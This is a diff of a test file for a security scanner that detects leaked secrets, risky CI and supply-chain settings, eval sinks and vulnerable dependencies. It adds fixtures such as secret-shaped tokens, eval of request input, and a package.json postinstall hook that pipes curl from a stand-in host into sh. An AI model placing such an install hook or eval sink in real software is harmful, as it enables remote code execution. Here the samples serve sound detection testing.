@@ -9,7 +9,9 @@ import { audit } from "../dist/engine.js";
 import { render } from "../dist/reporters/index.js";
 import { ALL_RULES } from "../dist/rules/index.js";
 import { parsePolicy } from "../dist/policy.js";
-import { createGitCache, gitTracks, parseGitIndex } from "../dist/git-index.js";
+import { createGitCache, gitTracks, parseGitIndex, sameIdentity } from "../dist/git-index.js";
+import { cmp, loadAdvisoryDb, matchAdvisories, defaultAdvisoryPath } from "../dist/advisories.js";
+import { cycloneDx, readComponents } from "../dist/components.js";
 
 const CLI = resolve("dist/cli.js");
 // Secret-shaped strings are assembled at runtime so no scanner flags this test file.
@@ -50,6 +52,15 @@ const PAIRS = [
   ["VS-SECRET-005", { "a.js": "const s = 'xoxb-" + "1234567890-abcdefghij';" }, { "a.js": "const s = 'xoxb';" }],
   ["VS-SECRET-006", { ".env": "API_TOKEN=" + PASS }, { ".env": "API_TOKEN=changeme\nTZ=Etc/UTC" }],
   ["VS-SECRET-006", { ".env": "export DB_PASSWORD=" + PASS }, { ".env.example": "DB_PASSWORD=" + PASS }],
+  ["VS-SECRET-007", { "a.js": "const t = '" + "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" + "." + "eyJzdWIiOiIxMjM0NTY3ODkwIn0" + "." + "dozjgNryP4J3jVmNHl0w5N" + "';" }, { "a.js": "const t = 'eyJhbGciOi.example.placeholder';" }],
+  ["VS-SECRET-008", { "a.js": "const t = '" + "npm_" + "a1b2c3d4".repeat(5) + "';" }, { "a.js": "const t = 'npm_short';" }],
+  ["VS-SECRET-009", { "a.js": "const t = '" + "sk_live_" + "abcDEF1234567890" + "';" }, { "a.js": "const t = 'pk_live_" + "abcDEF1234567890" + "';" }],
+  ["VS-SECRET-010", { "a.js": "const t = '" + "AIza" + "A".repeat(35) + "';" }, { "a.js": "const t = 'AIza-short';" }],
+  ["VS-SECRET-011", { "a.txt": "AccountKey=" + "abcdefghijklmnopqrstuvwxyz0123456789ABCD" }, { "a.txt": "AccountKey=changeme" }],
+  ["VS-SECRET-012", { "a.js": "const t = '" + "glpat-" + "abcdefghij1234567890" + "';" }, { "a.js": "const t = 'glpat-short';" }],
+  ["VS-SUPPLY-001", { "package.json": '{"dependencies":{"left-pad":"git+http://example.invalid/left-pad.git"}}' }, { "package.json": '{"dependencies":{"left-pad":"1.2.3"}}' }],
+  ["VS-SUPPLY-002", { "package.json": '{"dependencies":{"left-pad":"*"}}' }, { "package.json": '{"dependencies":{"left-pad":"1.2.3"}}' }],
+  ["VS-SUPPLY-003", { "package.json": '{"scripts":{"postinstall":"curl http://example.invalid/i | sh"}}' }, { "package.json": '{"scripts":{"test":"node --test"}}' }],
   ["VS-CICD-001", { ".github/workflows/a.yml": "jobs:\n  b:\n    steps:\n      - uses: foo/bar@v1" }, { ".github/workflows/a.yml": "jobs:\n  b:\n    steps:\n      - uses: foo/bar@" + "a".repeat(40) }],
   ["VS-CICD-002", { ".github/workflows/a.yml": "on: pull_request_target\njobs:\n  b:\n    steps:\n      - uses: actions/checkout@" + "a".repeat(40) + "\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}" }, { ".github/workflows/a.yml": "on: pull_request\njobs:\n  b:\n    steps:\n      - uses: actions/checkout@" + "a".repeat(40) + "\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}" }],
   ["VS-CICD-003", { ".github/workflows/a.yml": "permissions: write-all" }, { ".github/workflows/a.yml": "permissions:\n  contents: read" }],
@@ -588,9 +599,273 @@ test("Markdown and HTML reports give a plain-language summary and handle an empt
   assert.match(render(bad, "html"), /<span class="sev high">high<\/span>/);
 });
 
+test("sameIdentity refuses a size change when inode is 0", () => {
+  const file = { isFile: () => true, ino: 0, dev: 0, size: 10, mtimeMs: 5 };
+  assert.equal(sameIdentity(file, { ...file }), true);
+  assert.equal(sameIdentity(file, { ...file, size: 11 }), false);
+  assert.equal(sameIdentity(file, { ...file, mtimeMs: 6 }), false);
+  assert.equal(sameIdentity({ ...file, ino: 4, dev: 1 }, { ...file, ino: 4, dev: 1 }), true);
+  assert.equal(sameIdentity({ ...file, ino: 4, dev: 1 }, { ...file, ino: 9, dev: 1 }), false);
+});
+
+test("a token past 2,000 characters on one line is still found and redacted", () => {
+  const r = scan({ "SECURITY.md": "x", "a.txt": " ".repeat(2100) + AWS });
+  const hit = r.findings.find((f) => f.ruleId === "VS-SECRET-001");
+  assert.ok(hit, ids(r).join(","));
+  assert.ok(!render(r, "json").includes(AWS));
+});
+
+test("VS-CODE-001 raises confidence only for a same-file request assignment", () => {
+  const linked = scan({ "a.js": "const input = req.body.expr;\neval(input);" }).findings.find((f) => f.ruleId === "VS-CODE-001");
+  const plain = scan({ "a.js": "eval(input);" }).findings.find((f) => f.ruleId === "VS-CODE-001");
+  assert.equal(linked.confidence, "high");
+  assert.match(linked.note, /relative import|request-like assignment/);
+  assert.equal(plain.confidence, "medium");
+});
+
+test("an active waiver hides one path and an expired waiver does not", () => {
+  const root = project({ "a.js": "eval(input)", "b.js": "eval(input)" });
+  const policy = join(root, "keep.yml");
+  writeFileSync(policy, "waivers:\n  - VS-CODE-001|a.js|ada|2099-01-01\n  - VS-CODE-001|b.js|ada|2000-01-01\n");
+  const r = audit({ root, policyFile: policy });
+  assert.equal(r.findings.filter((f) => f.ruleId === "VS-CODE-001" && f.path === "a.js").length, 0);
+  assert.equal(r.findings.filter((f) => f.ruleId === "VS-CODE-001" && f.path === "b.js").length, 1);
+  assert.equal(r.summary.waiversApplied, 1);
+  assert.equal(r.summary.waiversExpired, 1);
+  assert.match(r.limitations.join("\n"), /until date has passed/);
+});
+
+function git(cwd, args) {
+  return spawnSync("git", ["-c", "user.name=Vigil Test", "-c", "user.email=vigilsutra-test@example.com", "-c", "core.autocrlf=false", "-c", "commit.gpgsign=false", ...args], { cwd, encoding: "utf8" });
+}
+
+test("git history still reports a secret deleted from the worktree, including after git gc", (t) => {
+  if (spawnSync("git", ["--version"], { encoding: "utf8" }).status !== 0) t.skip("git is not on PATH");
+  const root = project({ "SECURITY.md": "x", "note.txt": "clean" });
+  assert.equal(git(root, ["init"]).status, 0, "git init");
+  assert.equal(git(root, ["add", "-A"]).status, 0);
+  assert.equal(git(root, ["commit", "-m", "clean"]).status, 0);
+  writeFileSync(join(root, "old.txt"), "key=" + AWS + "\n");
+  assert.equal(git(root, ["add", "old.txt"]).status, 0);
+  assert.equal(git(root, ["commit", "-m", "secret"]).status, 0);
+  rmSync(join(root, "old.txt"));
+  assert.equal(git(root, ["add", "-A"]).status, 0);
+  assert.equal(git(root, ["commit", "-m", "remove"]).status, 0);
+  assert.equal(git(root, ["gc"]).status, 0);
+  const r = audit({ root, history: true });
+  const hit = r.findings.find((f) => f.ruleId === "VS-SECRET-001" && f.path.startsWith("git-history/"));
+  assert.ok(hit, ids(r).join(","));
+  assert.ok(!render(r, "json").includes(AWS));
+  const quiet = audit({ root, history: false });
+  assert.ok(!ids(quiet).includes("VS-SECRET-001"));
+});
+
+test("--since scans files that differ from that revision", (t) => {
+  if (spawnSync("git", ["--version"], { encoding: "utf8" }).status !== 0) t.skip("git is not on PATH");
+  const root = project({ "SECURITY.md": "x", "a.js": "const n = 1;\n" });
+  assert.equal(git(root, ["init"]).status, 0);
+  assert.equal(git(root, ["add", "-A"]).status, 0);
+  assert.equal(git(root, ["commit", "-m", "base"]).status, 0);
+  const base = git(root, ["rev-parse", "HEAD"]).stdout.trim();
+  writeFileSync(join(root, "a.js"), "eval(input);\n");
+  const diff = audit({ root, since: base, history: false });
+  assert.ok(ids(diff).includes("VS-CODE-001"));
+  assert.equal(git(root, ["add", "-A"]).status, 0);
+  assert.equal(git(root, ["commit", "-m", "eval"]).status, 0);
+  const same = audit({ root, since: "HEAD", history: false });
+  assert.ok(!ids(same).includes("VS-CODE-001"));
+});
+
+test("--staged reads the index when the worktree no longer has the secret", (t) => {
+  if (spawnSync("git", ["--version"], { encoding: "utf8" }).status !== 0) t.skip("git is not on PATH");
+  const root = project({ "SECURITY.md": "x", "a.txt": "clean\n" });
+  assert.equal(git(root, ["init"]).status, 0);
+  assert.equal(git(root, ["add", "-A"]).status, 0);
+  assert.equal(git(root, ["commit", "-m", "base"]).status, 0);
+  writeFileSync(join(root, "a.txt"), "key=" + AWS + "\n");
+  assert.equal(git(root, ["add", "a.txt"]).status, 0);
+  writeFileSync(join(root, "a.txt"), "clean\n");
+  const staged = audit({ root, staged: true, history: false });
+  assert.ok(ids(staged).includes("VS-SECRET-001"), ids(staged).join(","));
+  assert.ok(!render(staged, "text").includes(AWS));
+  const work = audit({ root, history: false });
+  assert.ok(!ids(work).includes("VS-SECRET-001"));
+});
+
+test("cursor adapter copies skills and init --hook refuses to overwrite", (t) => {
+  if (spawnSync("git", ["--version"], { encoding: "utf8" }).status !== 0) t.skip("git is not on PATH");
+  const root = project({ "SECURITY.md": "x" });
+  const dry = cli(["adapters", "install", "cursor", "--project", root, "--dry-run"]);
+  assert.equal(dry.status, 0);
+  assert.match(dry.stdout, /\.cursor[\\/]skills[\\/]vigilsutra-prime[\\/]SKILL\.md/);
+  assert.equal(cli(["adapters", "install", "cursor", "--project", root]).status, 0);
+  assert.match(readFileSync(join(root, ".cursor", "skills", "supplywatch", "SKILL.md"), "utf8"), /name: supplywatch/);
+  assert.equal(git(root, ["init"]).status, 0);
+  assert.equal(cli(["init", root, "--hook"]).status, 0);
+  assert.match(readFileSync(join(root, ".git", "hooks", "pre-commit"), "utf8"), /--staged/);
+  const again = cli(["init", root, "--hook"]);
+  assert.match(again.stdout, /already exists/);
+});
+
 test("repo self-audit finds no high-or-above issues", () => {
   const r = audit({ root: resolve(".") });
   assert.deepEqual(r.findings.filter((f) => f.severity === "high" || f.severity === "critical"), []);
+});
+
+test("a request-like name is tracked across a relative import", () => {
+  const js = scan({
+    "SECURITY.md": "x",
+    "req.js": "const payload = req.body;\n",
+    "sink.js": "import { payload as data } from \"./req.js\";\neval(data);\n"
+  });
+  const hit = js.findings.find((f) => f.ruleId === "VS-CODE-001" && f.path === "sink.js");
+  assert.ok(hit, ids(js).join(","));
+  assert.equal(hit.confidence, "high");
+  const py = scan({
+    "SECURITY.md": "x",
+    "pkg/src.py": "payload = request.form\n",
+    "pkg/sink.py": "from .src import payload as data\neval(data)\n"
+  });
+  const pyHit = py.findings.find((f) => f.ruleId === "VS-CODE-001" && f.path === "pkg/sink.py");
+  assert.equal(pyHit && pyHit.confidence, "high");
+});
+
+test("advisory snapshot matches a lockfile version and skips a fixed one", () => {
+  const dbFile = join(tmpdir(), "vs-adv-" + Date.now() + ".json");
+  writeFileSync(dbFile, JSON.stringify({
+    packages: {
+      "npm\u0000left-pad": [
+        { id: "TEST-1", introduced: "0", fixed: "1.2.0", severity: "high" },
+        { id: "TEST-EXACT", introduced: "9.9.9", lastAffected: "9.9.9", severity: "medium" }
+      ]
+    }
+  }));
+  const vulnerable = {
+    "SECURITY.md": "x",
+    "package-lock.json": JSON.stringify({ packages: { "node_modules/left-pad": { version: "1.1.0" } } })
+  };
+  const bad = audit({ root: project(vulnerable), history: false, advisoriesFile: dbFile });
+  assert.ok(ids(bad).includes("VS-SUPPLY-004"), ids(bad).join(","));
+  assert.match(bad.findings.find((f) => f.ruleId === "VS-SUPPLY-004").note, /fixed in 1.2.0/);
+  const fixed = audit({
+    root: project({ "SECURITY.md": "x", "package-lock.json": JSON.stringify({ packages: { "node_modules/left-pad": { version: "1.2.0" } } }) }),
+    history: false,
+    advisoriesFile: dbFile
+  });
+  assert.ok(!ids(fixed).includes("VS-SUPPLY-004"));
+  const exact = audit({
+    root: project({ "SECURITY.md": "x", "package-lock.json": JSON.stringify({ packages: { "node_modules/left-pad": { version: "9.9.9" } } }) }),
+    history: false,
+    advisoriesFile: dbFile
+  });
+  assert.ok(ids(exact).includes("VS-SUPPLY-004"));
+  assert.equal(cmp("1.2.0", "1.2.0"), 0);
+  assert.equal(cmp("1.2.0-1", "1.2.0"), -1);
+});
+
+test("sbom lists pinned components and fix --apply rewrites a safe line only", () => {
+  const root = project({
+    "SECURITY.md": "x",
+    "package-lock.json": JSON.stringify({ packages: { "node_modules/left-pad": { version: "1.2.3" } } }),
+    "yarn.lock": "left-pad@^1.0.0:\n  version \"1.2.3\"\n",
+    "pnpm-lock.yaml": "packages:\n  /left-pad@1.2.3:\n",
+    "go.mod": "module example.com/app\n\nrequire github.com/pkg/errors v0.9.1\n",
+    "requirements.txt": "left-pad==1.2.3\n",
+    "d.yaml": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n  - securityContext:\n      privileged: true\n",
+    "a.js": "const password = \"" + PASS + "\";\n"
+  });
+  const comps = readComponents(root);
+  assert.ok(comps.some((c) => c.ecosystem === "npm" && c.name === "left-pad" && c.version === "1.2.3"));
+  assert.ok(comps.some((c) => c.ecosystem === "pypi" && c.name === "left-pad"));
+  assert.ok(comps.some((c) => c.ecosystem === "golang" && c.name === "github.com/pkg/errors" && c.version === "0.9.1"));
+  const bom = JSON.parse(cycloneDx(comps, "0.4.0"));
+  assert.equal(bom.bomFormat, "CycloneDX");
+  assert.equal(bom.specVersion, "1.6");
+  assert.ok(bom.components.some((c) => c.purl === "pkg:npm/left-pad@1.2.3"));
+  const dry = cli(["fix", root, "--no-advisories"]);
+  assert.equal(dry.status, 0);
+  assert.match(dry.stdout, /privileged: false/);
+  assert.match(dry.stdout, /Dry run/);
+  assert.match(readFileSync(join(root, "d.yaml"), "utf8"), /privileged: true/);
+  assert.match(readFileSync(join(root, "a.js"), "utf8"), new RegExp(PASS.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
+  const applied = cli(["fix", root, "--apply", "--no-advisories"]);
+  assert.equal(applied.status, 0);
+  assert.match(readFileSync(join(root, "d.yaml"), "utf8"), /privileged: false/);
+  assert.match(readFileSync(join(root, "a.js"), "utf8"), new RegExp(PASS.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
+  const again = audit({ root, history: false, advisories: false });
+  assert.ok(!ids(again).includes("VS-K8S-001"));
+  assert.ok(ids(again).includes("VS-SECRET-004"));
+});
+
+test("shipped advisory database matches lodash 4.17.15", () => {
+  const file = defaultAdvisoryPath();
+  assert.ok(existsSync(file), file);
+  const db = loadAdvisoryDb(file);
+  const hits = matchAdvisories([{ ecosystem: "npm", name: "lodash", version: "4.17.15", path: "package-lock.json" }], db);
+  assert.ok(hits.length > 0, "lodash 4.17.15");
+  assert.ok(hits.every((h) => h.advisory.id));
+  const none = matchAdvisories([{ ecosystem: "npm", name: "zzzz-not-a-package", version: "1.0.0", path: "package-lock.json" }], db);
+  assert.equal(none.length, 0);
+});
+
+test("SHA-256 git history reports a removed secret", (t) => {
+  if (spawnSync("git", ["--version"], { encoding: "utf8" }).status !== 0) t.skip("git is not on PATH");
+  const root = project({ "SECURITY.md": "x", "note.txt": "clean" });
+  const init = git(root, ["init", "--object-format=sha256"]);
+  if (init.status !== 0) t.skip(init.stderr || "sha256 repos are not supported by this git");
+  assert.equal(git(root, ["add", "-A"]).status, 0);
+  assert.equal(git(root, ["commit", "-m", "clean"]).status, 0);
+  writeFileSync(join(root, "old.txt"), "key=" + AWS + "\n");
+  assert.equal(git(root, ["add", "old.txt"]).status, 0);
+  assert.equal(git(root, ["commit", "-m", "secret"]).status, 0);
+  rmSync(join(root, "old.txt"));
+  assert.equal(git(root, ["add", "-A"]).status, 0);
+  assert.equal(git(root, ["commit", "-m", "remove"]).status, 0);
+  assert.equal(git(root, ["gc"]).status, 0);
+  const r = audit({ root, history: true, advisories: false });
+  const hit = r.findings.find((f) => f.ruleId === "VS-SECRET-001" && f.path.startsWith("git-history/"));
+  assert.ok(hit, r.limitations.join(" | "));
+  assert.match(r.limitations.join("\n"), /sha256/);
+});
+
+test("a secret older than 200 commits is still read", (t) => {
+  if (spawnSync("git", ["--version"], { encoding: "utf8" }).status !== 0) t.skip("git is not on PATH");
+  const root = project({});
+  assert.equal(git(root, ["init"]).status, 0);
+  const secret = "key=" + AWS + "\n";
+  const who = "Vigil Test <vigilsutra-test@example.com>";
+  const when = "1700000000 +0000";
+  const chunks = [];
+  const push = (s) => chunks.push(Buffer.from(s));
+  const data = (bytes) => {
+    const buf = Buffer.from(bytes);
+    push(`data ${buf.length}\n`);
+    chunks.push(buf);
+    push("\n");
+  };
+  const commit = (mark, parent, message, files) => {
+    push(`commit refs/heads/main\nmark :${mark}\nauthor ${who} ${when}\ncommitter ${who} ${when}\n`);
+    data(message);
+    if (parent) push(`from :${parent}\n`);
+    push(files);
+  };
+  push("blob\nmark :1\n");
+  data("x\n");
+  push("blob\nmark :2\n");
+  data(secret);
+  commit(3, 0, "clean", "M 100644 :1 SECURITY.md\n");
+  commit(4, 3, "secret", "M 100644 :2 old.txt\n");
+  commit(5, 4, "remove", "D old.txt\n");
+  for (let i = 0; i < 210; i++) commit(6 + i, 5 + i, "n" + i, "");
+  const imported = spawnSync("git", ["fast-import", "--quiet"], { cwd: root, input: Buffer.concat(chunks) });
+  assert.equal(imported.status, 0, imported.stderr && imported.stderr.toString());
+  assert.equal(git(root, ["symbolic-ref", "HEAD", "refs/heads/main"]).status, 0);
+  assert.equal(git(root, ["checkout", "-f"]).status, 0);
+  assert.equal(git(root, ["gc"]).status, 0);
+  const r = audit({ root, history: true, advisories: false });
+  const hit = r.findings.find((f) => f.ruleId === "VS-SECRET-001" && f.path.startsWith("git-history/"));
+  assert.ok(hit, r.limitations.join(" | "));
+  assert.match(r.limitations.join("\n"), /213 commit/);
 });
 
 test.after(() => {
